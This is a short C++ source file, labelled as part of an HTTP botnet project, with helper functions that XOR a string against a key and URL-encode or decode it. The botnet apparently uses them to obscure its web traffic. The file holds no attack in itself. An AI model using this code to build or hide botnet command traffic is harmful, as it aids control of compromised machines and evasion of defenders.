/**
 * This file is part of UBoat - HTTP Botnet Project
 */

#include "WebSafeEncryption.h"
#include "URLEncoding.h"
#include "xor.h"

XorResult GetEncodedXorResult(const std::string& input, const std::string& key)
{
    XorResult output;
    std::string xoredInput = XORInputKey(input, key);

    output.content = URLEncode(xoredInput);
    output.key = URLEncode(key);

    return output;
}

std::string GetDecodedXorResult(const std::string& input, const std::string& key)
{
    std::string decodedInput = URLDecode(input);
    std::string decodedKey = URLDecode(key);

    return XORInputKey(decodedInput, decodedKey);
}
